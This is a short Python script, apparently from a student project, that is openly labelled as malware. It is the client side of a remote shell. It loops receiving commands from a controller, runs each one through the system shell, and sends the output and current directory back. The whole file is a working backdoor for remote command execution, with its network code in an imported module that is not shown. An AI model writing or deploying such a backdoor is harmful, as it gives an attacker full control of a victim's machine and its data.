from Class_Projet import *
import subprocess


malware = Malware()
malware.start()


while True:
    cmd = malware.receive()
    if cmd[:2] == "cd":
        os.chdir(cmd[3:])
    if cmd[0:6] == "quit()":
        malware.quit()
    else:
        var = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out_b = var.stdout.read() + var.stderr.read()
        out_s = out_b.decode("utf-8", errors="ignore")
        malware.send(out_s + "\n" + os.getcwd() + "> ")
        print(out_s)